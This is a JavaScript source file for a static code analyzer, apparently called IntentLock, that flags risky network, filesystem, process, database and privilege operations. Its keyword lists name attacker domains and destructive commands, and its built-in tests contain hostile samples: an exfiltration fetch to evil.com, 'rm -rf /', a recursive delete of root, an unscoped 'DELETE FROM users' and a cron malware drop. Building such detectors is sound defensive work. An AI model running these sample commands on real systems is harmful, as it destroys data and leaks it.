/**
 * IntentLock - Semantic Operation Analyzer
 * 
 * Enhanced with:
 * - Comprehensive semantic operation extraction (6 domains)
 * - Improved pattern detection
 * - Detailed logging throughout
 * - Structured semantic_operations output
 */

const fs = require('fs');

/**
 * Main analyzer function
 * Extracts semantic operations from code
 */
function analyzeBehavior(code) {
  console.log('\n' + '='.repeat(70));
  console.log('🔬 SEMANTIC ANALYZER - DETAILED LOGGING');
  console.log('='.repeat(70));

  const behavior = {
    routes: [],
    network_calls: [],
    fs_access: false,
    fs_operations: [],
    child_process: false,
    process_commands: [],
    hardcoded_secrets: false,
    db_queries: [],
    dependencies: [],
    semantic_operations: [],
    risk_summary: { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 }
  };

  // ====================================================================
  // DOMAIN 1: API ROUTES
  // ====================================================================
  console.log('\n[DOMAIN 1] Extracting API Routes...');
  const routePatterns = [
    /(?:app|router)\.(get|post|put|delete|patch|use)\s*\(\s*['"`]([^'"`]+)['"`]/gi,
    /router\.(get|post|put|delete|patch|use)\s*\(\s*['"`]([^'"`]+)['"`]/gi
  ];

  routePatterns.forEach((pattern, idx) => {
    let match;
    while ((match = pattern.exec(code)) !== null) {
      const method = match[1].toUpperCase();
      const path = match[2];
      behavior.routes.push({ method, path });
      console.log(`  ✓ Route: ${method} ${path}`);
      
      behavior.semantic_operations.push({
        domain: 'api',
        action: 'ROUTE_DEFINITION',
        target: path,
        scope: 'PUBLIC_ENDPOINT',
        risk: 'LOW',
        metadata: { method, path },
        raw: match[0]
      });
    }
  });

  // ====================================================================
  // DOMAIN 2: NETWORK CALLS
  // ====================================================================
  console.log('\n[DOMAIN 2] Extracting Network Calls...');
  
  // Fetch calls
  const fetchPattern = /fetch\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  let match;
  while ((match = fetchPattern.exec(code)) !== null) {
    const url = match[1];
    behavior.network_calls.push(url);
    const isSuspicious = isSuspiciousDomain(url);
    const risk = isSuspicious ? 'CRITICAL' : 'MEDIUM';
    console.log(`  ✓ fetch() call: ${url} [${risk}]`);
    
    behavior.semantic_operations.push({
      domain: 'network',
      action: 'OUTBOUND_REQUEST',
      target: url,
      scope: 'EXTERNAL',
      risk: risk,
      metadata: { 
        method: 'fetch',
        suspicious: isSuspicious,
        domain: extractDomain(url)
      },
      raw: match[0]
    });

    if (isSuspicious) behavior.risk_summary.CRITICAL++;
    else behavior.risk_summary.MEDIUM++;
  }

  // Axios calls
  const axiosPatterns = [
    /axios\.(get|post|put|delete)\s*\(\s*['"`]([^'"`]+)['"`]/gi,
    /axios\s*\(\s*[\{].*?url\s*:\s*['"`]([^'"`]+)['"`]/gi
  ];

  axiosPatterns.forEach(pattern => {
    while ((match = pattern.exec(code)) !== null) {
      const url = match[match.length - 1]; // Last capture group is URL
      if (!behavior.network_calls.includes(url)) {
        behavior.network_calls.push(url);
        const isSuspicious = isSuspiciousDomain(url);
        const risk = isSuspicious ? 'CRITICAL' : 'MEDIUM';
        console.log(`  ✓ axios() call: ${url} [${risk}]`);
        
        behavior.semantic_operations.push({
          domain: 'network',
          action: 'OUTBOUND_REQUEST',
          target: url,
          scope: 'EXTERNAL',
          risk: risk,
          metadata: { method: 'axios', suspicious: isSuspicious },
          raw: match[0]
        });

        if (isSuspicious) behavior.risk_summary.CRITICAL++;
        else behavior.risk_summary.MEDIUM++;
      }
    }
  });

  // ====================================================================
  // DOMAIN 3: FILESYSTEM OPERATIONS
  // ====================================================================
  console.log('\n[DOMAIN 3] Extracting Filesystem Operations...');
  
  const fsPatterns = [
    { regex: /fs\.(readFile|readFileSync)\s*\(\s*['"`]([^'"`]+)['"`]/gi, action: 'READ' },
    { regex: /fs\.(writeFile|writeFileSync)\s*\(\s*['"`]([^'"`]+)['"`]/gi, action: 'WRITE' },
    { regex: /fs\.(rm|rmSync)\s*\(\s*['"`]([^'"`]+)['"`](?:.*?{.*?recursive\s*:\s*true.*?})?/gi, action: 'DELETE' },
    { regex: /fs\.(unlink|unlinkSync)\s*\(\s*['"`]([^'"`]+)['"`]/gi, action: 'DELETE' },
    { regex: /fs\.(rmdir|rmdirSync)\s*\(\s*['"`]([^'"`]+)['"`](?:.*?{.*?recursive\s*:\s*true.*?})?/gi, action: 'DELETE' },
    { regex: /fs\.promises\.(rm|readFile|writeFile|unlink)\s*\(\s*['"`]([^'"`]+)['"`]/gi, action: 'ASYNC_FS' },
    { regex: /fs\.(chmod|chown|chmodSync|chownSync)\s*\(\s*['"`]([^'"`]+)['"`]/gi, action: 'PERMISSION_CHANGE' }
  ];

  fsPatterns.forEach(({ regex, action }) => {
    while ((match = regex.exec(code)) !== null) {
      const filePath = match[2];
      behavior.fs_access = true;

      // Check if recursive delete
      const isRecursive = match[0].includes('recursive') && match[0].includes('true');
      const isSystemPath = isSystemFilePath(filePath);
      
      const risk = (action === 'DELETE' && (isRecursive || isSystemPath)) ? 'CRITICAL' : 
                   (action === 'DELETE') ? 'HIGH' :
                   (action === 'PERMISSION_CHANGE') ? 'MEDIUM' : 'LOW';

      console.log(`  ✓ fs.${action}(): ${filePath} ${isRecursive ? '[RECURSIVE]' : ''} [${risk}]`);

      behavior.fs_operations.push({
        action,
        path: filePath,
        recursive: isRecursive,
        systemPath: isSystemPath
      });

      behavior.semantic_operations.push({
        domain: 'filesystem',
        action: action,
        target: filePath,
        scope: isRecursive ? 'RECURSIVE' : 'SINGLE_FILE',
        risk: risk,
        metadata: { 
          recursive: isRecursive,
          systemPath: isSystemPath,
          fsMethod: match[1]
        },
        raw: match[0]
      });

      behavior.risk_summary[risk]++;
    }
  });

  // ====================================================================
  // DOMAIN 4: CHILD PROCESS EXECUTION
  // ====================================================================
  console.log('\n[DOMAIN 4] Extracting Child Process Execution...');
  
  const processPatterns = [
    { regex: /exec\s*\(\s*['"`]([^'"`]+)['"`]/gi, method: 'exec' },
    { regex: /execSync\s*\(\s*['"`]([^'"`]+)['"`]/gi, method: 'execSync' },
    { regex: /spawn\s*\(\s*['"`]([^'"`]+)['"`]/gi, method: 'spawn' },
    { regex: /fork\s*\(\s*['"`]([^'"`]+)['"`]/gi, method: 'fork' },
    { regex: /shelljs\.exec\s*\(\s*['"`]([^'"`]+)['"`]/gi, method: 'shelljs.exec' },
    // Also catch exec/execSync with variables (still risky)
    { regex: /exec(?:Sync)?\s*\(\s*(\w+)\s*[,\)]/gi, method: 'exec_variable', variable: true },
    { regex: /spawn\s*\(\s*(\w+)\s*[,\)]/gi, method: 'spawn_variable', variable: true }
  ];

  const dangerousCommands = ['rm -rf', 'dd ', 'mkfs', 'format', 'wipe', 'fork', ':(){ *:', 'chmod 777'];

  processPatterns.forEach(({ regex, method, variable }) => {
    let match;
    while ((match = regex.exec(code)) !== null) {
      behavior.child_process = true;
      const command = variable ? `[variable: ${match[1]}]` : match[1];
      const isDangerous = !variable && dangerousCommands.some(dc => match[1].includes(dc));
      const risk = isDangerous ? 'CRITICAL' : variable ? 'MEDIUM' : 'HIGH';

      console.log(`  ✓ ${method}(): "${command}" [${risk}]${isDangerous ? ' ⚠️ DANGEROUS' : ''}`);

      behavior.process_commands.push({
        method,
        command,
        dangerous: isDangerous,
        variable: variable
      });

      behavior.semantic_operations.push({
        domain: 'process',
        action: 'COMMAND_EXECUTION',
        target: command,
        scope: 'EXTERNAL_PROCESS',
        risk: risk,
        metadata: { 
          method: method,
          dangerous: isDangerous,
          destructive: isDangerous,
          variable: variable
        },
        raw: match[0]
      });

      behavior.risk_summary[risk]++;
    }
  });

  // ====================================================================
  // DOMAIN 5: DATABASE OPERATIONS
  // ====================================================================
  console.log('\n[DOMAIN 5] Extracting Database Operations...');
  
  const sqlPatterns = [
    /DELETE\s+FROM\s+(\w+)(?:\s+WHERE.*?)?(?:;|$)/gi,
    /UPDATE\s+(\w+)\s+SET.*?(?:\s+WHERE.*?)?(?:;|$)/gi,
    /INSERT\s+INTO\s+(\w+)/gi,
    /SELECT\s+.*?\s+FROM\s+(\w+)/gi
  ];

  sqlPatterns.forEach(pattern => {
    while ((match = pattern.exec(code)) !== null) {
      const query = match[0].trim();
      const table = match[1];
      behavior.db_queries.push(query);

      let action = 'QUERY';
      let risk = 'LOW';

      if (query.toUpperCase().startsWith('DELETE')) {
        action = 'BULK_DELETE';
        const hasWhere = query.toUpperCase().includes('WHERE');
        risk = hasWhere ? 'MEDIUM' : 'CRITICAL';
      } else if (query.toUpperCase().startsWith('UPDATE')) {
        action = 'BULK_UPDATE';
        const hasWhere = query.toUpperCase().includes('WHERE');
        risk = hasWhere ? 'MEDIUM' : 'HIGH';
      } else if (query.toUpperCase().startsWith('INSERT')) {
        risk = 'LOW';
        action = 'INSERT';
      }

      console.log(`  ✓ ${action} (${table}): [${risk}]`);

      behavior.semantic_operations.push({
        domain: 'database',
        action: action,
        target: table,
        scope: action.includes('BULK') ? 'ALL_ROWS' : 'SINGLE_ROW',
        risk: risk,
        metadata: { 
          query: query,
          table: table,
          hasWhere: query.toUpperCase().includes('WHERE')
        },
        raw: query
      });

      behavior.risk_summary[risk]++;
    }
  });

  // ====================================================================
  // DOMAIN 6: AUTHENTICATION & AUTHORIZATION
  // ====================================================================
  console.log('\n[DOMAIN 6] Extracting Auth/Authorization Operations...');
  
  const authPatterns = [
    { regex: /user\.role\s*=\s*['"`]?(admin|root|superuser)['"`]?/gi, action: 'PRIVILEGE_ESCALATION' },
    { regex: /grantRole\s*\(\s*['"`](admin|root|superuser)['"`]/gi, action: 'PRIVILEGE_GRANT' },
    { regex: /assignRole\s*\(\s*['"`](admin|root|superuser)['"`]/gi, action: 'PRIVILEGE_GRANT' },
    { regex: /setAdmin\s*\(\s*true/gi, action: 'PRIVILEGE_ESCALATION' },
    { regex: /isAdmin\s*=\s*true/gi, action: 'PRIVILEGE_ESCALATION' },
    { regex: /permissions\s*\[\s*['"`]admin['"`]\s*\]\s*=\s*true/gi, action: 'PRIVILEGE_GRANT' }
  ];

  authPatterns.forEach(({ regex, action }) => {
    while ((match = regex.exec(code)) !== null) {
      console.log(`  ✓ ${action}: ${match[0]} [CRITICAL]`);

      behavior.semantic_operations.push({
        domain: 'auth',
        action: action,
        target: 'SYSTEM_PRIVILEGES',
        scope: 'GLOBAL',
        risk: 'CRITICAL',
        metadata: { 
          target: match[1] || 'admin'
        },
        raw: match[0]
      });

      behavior.risk_summary.CRITICAL++;
    }
  });

  // ====================================================================
  // EXTRACT DEPENDENCIES
  // ====================================================================
  console.log('\n[DEPENDENCIES] Extracting Package Dependencies...');
  
  const requirePattern = /require\s*\(\s*['"`]([^'"`/]+)['"`]\s*\)/g;
  const importPattern = /import\s+.*?from\s+['"`]([^'"`/]+)['"`]/g;

  const deps = new Set();
  
  [requirePattern, importPattern].forEach(pattern => {
    while ((match = pattern.exec(code)) !== null) {
      const pkg = match[1].split('/')[0]; // Handle scoped packages
      deps.add(pkg);
    }
  });

  behavior.dependencies = Array.from(deps);
  if (behavior.dependencies.length > 0) {
    console.log(`  ✓ Found ${behavior.dependencies.length} dependencies:`, behavior.dependencies.join(', '));
  }

  // ====================================================================
  // HARDCODED SECRETS
  // ====================================================================
  console.log('\n[SECRETS] Checking for Hardcoded Secrets...');
  
  const secretPattern = /(apiKey|password|secret|token|auth|credential|api_key|access_token)\s*[=:]\s*['"`]([^'"`]{10,})['"`]/gi;
  
  if (secretPattern.test(code)) {
    behavior.hardcoded_secrets = true;
    console.log('  ⚠️  Hardcoded secrets detected [MEDIUM]');
    
    behavior.semantic_operations.push({
      domain: 'api',
      action: 'HARDCODED_SECRET',
      target: 'CREDENTIALS',
      scope: 'CODE_EMBEDDING',
      risk: 'MEDIUM',
      metadata: { type: 'credentials' },
      raw: 'hardcoded_secret'
    });

    behavior.risk_summary.MEDIUM++;
  }

  // ====================================================================
  // SUMMARY
  // ====================================================================
  console.log('\n' + '='.repeat(70));
  console.log('📊 ANALYSIS SUMMARY');
  console.log('='.repeat(70));
  console.log(`\n📈 Risk Breakdown:`);
  console.log(`   CRITICAL: ${behavior.risk_summary.CRITICAL}`);
  console.log(`   HIGH:     ${behavior.risk_summary.HIGH}`);
  console.log(`   MEDIUM:   ${behavior.risk_summary.MEDIUM}`);
  console.log(`   LOW:      ${behavior.risk_summary.LOW}`);
  console.log(`\n📋 Operations Found:`);
  console.log(`   API Routes:        ${behavior.routes.length}`);
  console.log(`   Network Calls:     ${behavior.network_calls.length}`);
  console.log(`   File Operations:   ${behavior.fs_operations.length}`);
  console.log(`   Process Executions: ${behavior.process_commands.length}`);
  console.log(`   DB Queries:        ${behavior.db_queries.length}`);
  console.log(`   Dependencies:      ${behavior.dependencies.length}`);
  console.log(`   Semantic Operations: ${behavior.semantic_operations.length}`);
  console.log('\n' + '='.repeat(70) + '\n');

  return behavior;
}

/**
 * Check if domain is suspicious
 */
function isSuspiciousDomain(url) {
  const suspicious = ['evil', 'malicious', 'steal', 'hack', 'c2', 'botnet', 'command', 'control'];
  return suspicious.some(word => url.toLowerCase().includes(word));
}

/**
 * Extract domain from URL
 */
function extractDomain(url) {
  try {
    const domain = new URL(url).hostname;
    return domain;
  } catch (e) {
    return url;
  }
}

/**
 * Check if path is a system file
 */
function isSystemFilePath(path) {
  const systemPaths = ['/', '/bin', '/boot', '/etc', '/lib', '/sys', '/root', '/home', '/var/lib', '/usr/bin', '/usr/lib'];
  return systemPaths.some(sys => path.startsWith(sys)) || 
         path.includes('/etc/passwd') || 
         path.includes('/etc/shadow') ||
         path.includes('/.ssh');
}

// ====================================================================
// TEST CASES
// ====================================================================
if (require.main === module) {
  console.log('\n\n╔════════════════════════════════════════════════════════════════╗');
  console.log('║         INTENTLOCK ANALYZER - TEST SUITE                       ║');
  console.log('╚════════════════════════════════════════════════════════════════╝');

  const testCases = [
    {
      name: 'TEST 1: Network Call to Malicious Domain',
      code: `
const fetch = require('fetch');
fetch('https://evil.com/steal-data');
      `
    },
    {
      name: 'TEST 2: Filesystem Recursive Delete',
      code: `
const fs = require('fs');
fs.rm('/', { recursive: true });
      `
    },
    {
      name: 'TEST 3: Dangerous Shell Execution',
      code: `
const { exec } = require('child_process');
exec('rm -rf /');
      `
    },
    {
      name: 'TEST 4: Bulk Database Delete',
      code: `
const db = require('db');
db.query('DELETE FROM users;');
      `
    },
    {
      name: 'TEST 5: Privilege Escalation',
      code: `
const user = { role: 'user' };
user.role = 'admin';
      `
    },
    {
      name: 'TEST 6: File Write + Process Execute',
      code: `
const fs = require('fs');
const { exec } = require('child_process');
fs.writeFileSync('/etc/cron.d/malware', 'evil script');
exec('chmod +x /etc/cron.d/malware');
      `
    }
  ];

  testCases.forEach(test => {
    console.log(`\n\n► ${test.name}`);
    const result = analyzeBehavior(test.code);
    console.log('\n  Result:');
    console.log(`  - Violations: ${result.semantic_operations.filter(o => ['CRITICAL', 'HIGH'].includes(o.risk)).length}`);
    console.log(`  - Critical: ${result.risk_summary.CRITICAL}`);
  });
}

module.exports = { analyzeBehavior };
